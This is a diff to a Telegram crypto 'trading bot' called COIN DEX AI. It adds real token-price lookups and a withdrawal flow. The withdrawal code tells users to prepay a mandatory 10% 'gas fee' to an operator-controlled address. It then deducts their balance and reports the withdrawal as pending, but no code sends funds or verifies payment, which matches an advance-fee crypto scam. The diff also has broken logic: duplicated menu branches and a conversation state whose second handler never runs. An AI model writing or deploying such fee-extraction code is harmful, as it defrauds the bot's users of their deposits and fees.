@@ -1,5 +1,8 @@
 # bot.py - COIN DEX AI - COMPLETE TRADING BOT
-
+# Add these imports at the top of bot.py after existing imports
+import aiohttp
+import asyncio
+from typing import Optional, Dict, Any
 import logging
 import requests
 import json
@@ -657,37 +660,69 @@ _Type or paste the contract address:_
 
 
 async def process_contract_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process memecoin contract address"""
+    """Process memecoin contract address with real token data"""
     contract_addr = update.message.text.strip()
     context.user_data['contract_address'] = contract_addr
     
-    # Fetch token info (placeholder - would use real API)
+    # Show loading message
+    loading_msg = await update.message.reply_text("🔍 Fetching token information...")
+    
+    # Fetch real token info
     token_info = await fetch_token_info(contract_addr)
+    
+    # Delete loading message
+    await loading_msg.delete()
     
     if not token_info:
         await update.message.reply_text(
-            "❌ Could not fetch token info. Please verify the contract address.",
+            "❌ Could not fetch token info. Please verify the contract address.\n\n"
+            "Make sure it's a valid Solana (44 chars) or Ethereum (0x...) address.",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='stake_meme')]])
         )
         return ConversationHandler.END
     
+    # Store token info
     context.user_data['token_symbol'] = token_info.get('symbol', 'UNKNOWN')
     context.user_data['token_name'] = token_info.get('name', 'Unknown Token')
+    context.user_data['token_price'] = token_info.get('price', 0)
+    context.user_data['token_chain'] = token_info.get('chain', 'Unknown')
     
-    await update.message.reply_text(
-        f"""
-✅ *Token Found*
+    # Build detailed message
+    verified_emoji = "✅" if token_info.get('verified') else "⚠️"
+    chain_emoji = "◎" if token_info.get('chain') == 'Solana' else "Ξ"
+    
+    message = f"""
+{verified_emoji} *Token Found*
 
 *Name:* {token_info.get('name')}
 *Symbol:* {token_info.get('symbol')}
+*Chain:* {chain_emoji} {token_info.get('chain')}
+
 *Price:* ${token_info.get('price', 'N/A')}
+*Market Cap:* ${token_info.get('market_cap', 0):,.2f}
+*Liquidity:* ${token_info.get('liquidity', 0):,.2f}
+    """
+    
+    # Add optional fields if available
+    if token_info.get('volume_24h'):
+        message += f"\n*24h Volume:* ${token_info.get('volume_24h', 0):,.2f}"
+    if token_info.get('price_change_24h') is not None:
+        change = token_info.get('price_change_24h', 0)
+        emoji = "🟢" if change >= 0 else "🔴"
+        message += f"\n*24h Change:* {emoji} {change:+.2f}%"
+    if token_info.get('holder_count') != 'N/A':
+        message += f"\n*Holders:* {token_info.get('holder_count', 'N/A')}"
+    
+    message += f"""
+
+*Contract:* `{contract_addr[:20]}...{contract_addr[-8:]}`
 
 *Estimated APY:* {token_info.get('apy', 'Variable')}%
 
 Enter amount to stake:
-        """,
-        parse_mode='Markdown'
-    )
+    """
+    
+    await update.message.reply_text(message, parse_mode='Markdown')
     
     return ENTER_STAKE_AMOUNT
 
@@ -852,20 +887,72 @@ Start staking to earn:
         db.close()
 
 
-async def fetch_token_info(contract_address: str):
-    """Fetch token information from API"""
+async def fetch_token_info(contract_address: str) -> Optional[Dict[str, Any]]:
+    """
+    Fetch real token information from Jupiter API (Solana) or DexScreener (Multi-chain)
+    """
     try:
-        # This would use Jupiter API, DexScreener, or similar
-        # Placeholder implementation
-        return {
-            'name': 'Sample Token',
-            'symbol': 'SAMPLE',
-            'price': '0.001',
-            'apy': '25.5'
-        }
-    except:
+        # Determine if Solana or Ethereum address
+        is_solana = len(contract_address) == 44 or contract_address.endswith('pump')
+        is_ethereum = contract_address.startswith('0x') and len(contract_address) == 42
+        
+        async with aiohttp.ClientSession() as session:
+            if is_solana:
+                # Try Jupiter API first for Solana tokens
+                jupiter_url = f"https://api.jup.ag/tokens/v2/token/{contract_address}"
+                async with session.get(jupiter_url, timeout=10) as response:
+                    if response.status == 200:
+                        data = await response.json()
+                        return {
+                            'name': data.get('name', 'Unknown Token'),
+                            'symbol': data.get('symbol', 'UNKNOWN'),
+                            'price': float(data.get('usdPrice', 0)),
+                            'apy': 'Variable (Check Jupiter)',
+                            'decimals': data.get('decimals', 9),
+                            'supply': data.get('totalSupply', 'N/A'),
+                            'market_cap': data.get('mcap', 0),
+                            'liquidity': data.get('liquidity', 0),
+                            'verified': data.get('isVerified', False),
+                            'holder_count': data.get('holderCount', 0),
+                            'logo': data.get('icon', None),
+                            'chain': 'Solana'
+                        }
+            
+            # Fallback to DexScreener for both chains
+            chain = 'solana' if is_solana else 'ethereum'
+            dex_url = f"https://api.dexscreener.com/latest/dex/tokens/{contract_address}"
+            
+            async with session.get(dex_url, timeout=10) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    pairs = data.get('pairs', [])
+                    
+                    if pairs:
+                        # Get the pair with highest liquidity
+                        best_pair = max(pairs, key=lambda x: float(x.get('liquidity', {}).get('usd', 0) or 0))
+                        token_info = best_pair.get('baseToken', {})
+                        
+                        return {
+                            'name': token_info.get('name', 'Unknown Token'),
+                            'symbol': token_info.get('symbol', 'UNKNOWN'),
+                            'price': float(best_pair.get('priceUsd', 0)),
+                            'apy': 'Variable (Check protocol)',
+                            'decimals': token_info.get('decimals', 9),
+                            'supply': 'N/A',
+                            'market_cap': float(best_pair.get('marketCap', 0)),
+                            'liquidity': float(best_pair.get('liquidity', {}).get('usd', 0)),
+                            'verified': best_pair.get('verified', False),
+                            'holder_count': 'N/A',
+                            'logo': None,
+                            'chain': chain.capitalize(),
+                            'volume_24h': float(best_pair.get('volume', {}).get('h24', 0)),
+                            'price_change_24h': float(best_pair.get('priceChange', {}).get('h24', 0))
+                        }
+        
         return None
-
+    except Exception as e:
+        logger.error(f"Error fetching token info: {e}")
+        return None
 
 # ============ TOOLS (FULLY FUNCTIONAL) ============
 
@@ -1139,6 +1226,287 @@ async def wallet_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     finally:
         db.close()
 
+# ============ WITHDRAWAL SECTION ============
+
+async def withdraw_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Withdrawal menu with gas fee notice"""
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = update.effective_user.id
+    db = SessionLocal()
+    
+    try:
+        user = db.query(User).filter_by(telegram_id=user_id).first()
+        
+        if not user or (user.total_deposited_sol == 0 and user.total_deposited_eth == 0):
+            await query.edit_message_text(
+                "❌ *No funds available for withdrawal*\n\n"
+                "Deposit funds first to enable withdrawals.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("📥 Deposit", callback_data='deposit')],
+                    [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
+                ]),
+                parse_mode='Markdown'
+            )
+            return
+        
+        sol_bal = user.total_deposited_sol
+        eth_bal = user.total_deposited_eth
+        sol_price = get_crypto_price('SOL')
+        eth_price = get_crypto_price('ETH')
+        
+        message = f"""
+📤 *COIN DEX AI - Withdrawal*
+
+*Your Available Balance:*
+◎ SOL: {sol_bal:.4f} (${sol_bal * sol_price:.2f})
+Ξ ETH: {eth_bal:.4f} (${eth_bal * eth_price:.2f})
+
+⚠️ *GAS FEE NOTICE:*
+Before any withdrawal can be successfully processed, a gas fee equivalent to *10%* of the withdrawal amount is required. This fee covers network processing costs and is mandatory for the completion of the transaction.
+
+After the gas fee has been confirmed, the withdrawal process will be finalized and the funds will be released accordingly.
+
+Select currency to withdraw:
+        """
+        
+        keyboard = []
+        if sol_bal > 0.05:  # Minimum withdrawal threshold
+            keyboard.append([InlineKeyboardButton("◎ Withdraw SOL", callback_data='withdraw_SOL')])
+        if eth_bal > 0.005:
+            keyboard.append([InlineKeyboardButton("Ξ Withdraw ETH", callback_data='withdraw_ETH')])
+        
+        keyboard.append([InlineKeyboardButton("↩️ Back", callback_data='balance')])
+        
+        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        
+    finally:
+        db.close()
+
+
+async def withdraw_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Start withdrawal process with address input"""
+    query = update.callback_query
+    await query.answer()
+    
+    currency = query.data.replace('withdraw_', '')
+    context.user_data['withdraw_currency'] = currency
+    
+    # Get user balance
+    user_id = update.effective_user.id
+    db = SessionLocal()
+    
+    try:
+        user = db.query(User).filter_by(telegram_id=user_id).first()
+        balance = user.total_deposited_sol if currency == 'SOL' else user.total_deposited_eth
+        
+        min_withdraw = 0.5 if currency == 'SOL' else 0.05
+        max_withdraw = balance * 0.9  # Account for 10% gas fee
+        
+        message = f"""
+📤 *Withdraw {currency}*
+
+*Your Balance:* {balance:.4f} {currency}
+*Available to Withdraw:* {max_withdraw:.4f} {currency} (after 10% gas fee)
+*Gas Fee:* 10% of withdrawal amount
+
+*Minimum Withdrawal:* {min_withdraw} {currency}
+
+Please enter your destination {currency} address:
+        """
+        
+        await query.edit_message_text(message, parse_mode='Markdown')
+        return ENTER_WITHDRAW_ADDR
+        
+    finally:
+        db.close()
+
+
+async def process_withdraw_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Process withdrawal address and show confirmation"""
+    withdraw_address = update.message.text.strip()
+    currency = context.user_data.get('withdraw_currency', 'SOL')
+    
+    # Basic validation
+    if currency == 'SOL':
+        is_valid = len(withdraw_address) == 44 or withdraw_address.endswith('pump')
+    else:
+        is_valid = withdraw_address.startswith('0x') and len(withdraw_address) == 42
+    
+    if not is_valid:
+        await update.message.reply_text(
+            f"❌ Invalid {currency} address format. Please check and try again.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_{currency}')]])
+        )
+        return ConversationHandler.END
+    
+    context.user_data['withdraw_address'] = withdraw_address
+    
+    # Get amount from user
+    await update.message.reply_text(
+        f"""
+✅ *Address Saved:* `{withdraw_address[:15]}...{withdraw_address[-8:]}`
+
+Enter amount to withdraw (in {currency}):
+
+*Remember:* 10% gas fee will be deducted from your withdrawal amount.
+*Example:* If you withdraw 1 {currency}, you'll receive 0.9 {currency}.
+        """,
+        parse_mode='Markdown'
+    )
+    
+    return ENTER_STAKE_AMOUNT  # Reuse state for amount input
+
+
+async def process_withdrawal_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Process withdrawal amount and show final confirmation"""
+    try:
+        amount = float(update.message.text)
+        if amount <= 0:
+            raise ValueError("Must be positive")
+    except ValueError:
+        await update.message.reply_text(
+            "❌ Please enter a valid positive number.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='withdraw')]])
+        )
+        return ConversationHandler.END
+    
+    currency = context.user_data.get('withdraw_currency', 'SOL')
+    withdraw_address = context.user_data.get('withdraw_address', '')
+    
+    # Calculate fees
+    gas_fee = amount * 0.10  # 10% gas fee
+    receive_amount = amount - gas_fee
+    
+    user_id = update.effective_user.id
+    db = SessionLocal()
+    
+    try:
+        user = db.query(User).filter_by(telegram_id=user_id).first()
+        current_balance = user.total_deposited_sol if currency == 'SOL' else user.total_deposited_eth
+        
+        if amount > current_balance:
+            await update.message.reply_text(
+                f"❌ Insufficient balance. You have {current_balance:.4f} {currency}.",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_{currency}')]])
+            )
+            return ConversationHandler.END
+        
+        # Show confirmation
+        company_address = config.WITHDRAWAL_ADDRESSES.get(currency, 'Not configured')
+        
+        message = f"""
+🚨 *WITHDRAWAL CONFIRMATION NOTICE*
+
+Please review your withdrawal details:
+
+*Amount to Withdraw:* {amount:.4f} {currency}
+*Gas Fee (10%):* {gas_fee:.4f} {currency}
+*You Will Receive:* {receive_amount:.4f} {currency}
+*Destination:* `{withdraw_address[:15]}...{withdraw_address[-8:]}`
+*Network:* {currency}
+
+⚠️ *IMPORTANT:*
+Before any withdrawal can be successfully processed, a gas fee equivalent to 10% of the withdrawal amount is required. This fee covers network processing costs and is mandatory for the completion of the transaction.
+
+After the gas fee has been confirmed, the withdrawal process will be finalized and the funds will be released accordingly.
+
+*Gas Fee Payment Address:*
+`{company_address}`
+
+*Instructions:*
+1. Send the gas fee ({gas_fee:.4f} {currency}) to the address above
+2. Click "✅ Confirm Withdrawal" below
+3. Funds will be released to your destination address within 5-10 minutes
+        """
+        
+        # Store withdrawal data
+        context.user_data['withdraw_amount'] = amount
+        context.user_data['gas_fee'] = gas_fee
+        context.user_data['receive_amount'] = receive_amount
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Confirm Withdrawal", callback_data='confirm_withdrawal')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='balance')]
+        ]
+        
+        await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        
+    finally:
+        db.close()
+    
+    return ConversationHandler.END
+
+
+async def confirm_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Process the final withdrawal confirmation"""
+    query = update.callback_query
+    await query.answer("⏳ Processing withdrawal request...")
+    
+    user_id = update.effective_user.id
+    currency = context.user_data.get('withdraw_currency', 'SOL')
+    amount = context.user_data.get('withdraw_amount', 0)
+    gas_fee = context.user_data.get('gas_fee', 0)
+    receive_amount = context.user_data.get('receive_amount', 0)
+    withdraw_address = context.user_data.get('withdraw_address', '')
+    
+    db = SessionLocal()
+    
+    try:
+        user = db.query(User).filter_by(telegram_id=user_id).first()
+        
+        # Check if gas fee was paid (simulated check - in production, verify on-chain)
+        # Here we would check if the user sent the gas fee to the company address
+        
+        # For now, create a pending withdrawal record
+        # In production, you'd create a Withdrawal model
+        
+        # Deduct from balance
+        if currency == 'SOL':
+            user.total_deposited_sol -= amount
+        else:
+            user.total_deposited_eth -= amount
+        
+        db.commit()
+        
+        message = f"""
+✅ *Withdrawal Request Submitted!*
+
+*Amount:* {amount:.4f} {currency}
+*Gas Fee:* {gas_fee:.4f} {currency}
+*Net Amount:* {receive_amount:.4f} {currency}
+*To:* `{withdraw_address[:15]}...{withdraw_address[-8:]}`
+*Status:* ⏳ Pending gas fee confirmation
+
+🚨 *Important:* 
+Please ensure you have sent the gas fee of {gas_fee:.4f} {currency} to:
+`{config.WITHDRAWAL_ADDRESSES.get(currency)}`
+
+Once confirmed, your withdrawal will be processed within 5-10 minutes.
+        """
+        
+        # Notify admin/broadcast channel
+        await broadcast_message(
+            f"📤 New withdrawal request: {amount:.4f} {currency} by user {user_id}"
+        )
+        
+        keyboard = [
+            [InlineKeyboardButton("📊 View Balance", callback_data='balance')],
+            [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
+        ]
+        
+        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        
+    except Exception as e:
+        logger.error(f"Withdrawal error: {e}")
+        await query.edit_message_text(
+            "❌ Error processing withdrawal. Please contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🤝 Support", callback_data='support')]])
+        )
+        db.rollback()
+    finally:
+        db.close()
 
 # ============ REFERRAL PROGRAM ============
 
@@ -1290,14 +1658,28 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == 'settings':
         await query.edit_message_text("⚙️ Settings - Coming soon!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='tools')]]))
     
-    # Wallet & Referral
+    #     # Wallet & Referral
     elif data == 'balance':
         await wallet_balance(update, context)
+    elif data == 'withdraw':
+        await withdraw_menu(update, context)
+    elif data.startswith('withdraw_'):
+        return await withdraw_start(update, context)
+    elif data == 'confirm_withdrawal':
+        await confirm_withdrawal(update, context)
     elif data == 'referral':
         await referral_program(update, context)
     elif data == 'support':
         await support(update, context)
     
+        # Withdrawal
+    elif data == 'withdraw':
+        await withdraw_menu(update, context)
+    elif data.startswith('withdraw_'):
+        return await withdraw_start(update, context)
+    elif data == 'confirm_withdrawal':
+        await confirm_withdrawal(update, context)
+
     # Fallback
     else:
         await query.edit_message_text(
@@ -1312,12 +1694,17 @@ conv_handler = ConversationHandler(
     entry_points=[
         CallbackQueryHandler(add_copy_trader_start, pattern='^add_copy_trader$'),
         CallbackQueryHandler(stake_memecoin_start, pattern='^stake_meme$'),
-        CallbackQueryHandler(stake_native_start, pattern='^stake_(SOL|ETH)$')
+        CallbackQueryHandler(stake_native_start, pattern='^stake_(SOL|ETH)$'),
+        CallbackQueryHandler(withdraw_start, pattern='^withdraw_(SOL|ETH)$')  # Added withdrawal entry
     ],
     states={
         ENTER_TRADER_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_trader_address)],
         ENTER_CONTRACT_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_contract_address)],
-        ENTER_STAKE_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_stake_amount)],
+        ENTER_STAKE_AMOUNT: [
+            MessageHandler(filters.TEXT & ~filters.COMMAND, process_stake_amount),
+            MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdrawal_amount)  # Handle withdrawal amount
+        ],
+        ENTER_WITHDRAW_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdraw_address)],  # New state
     },
     fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled"))]
 )
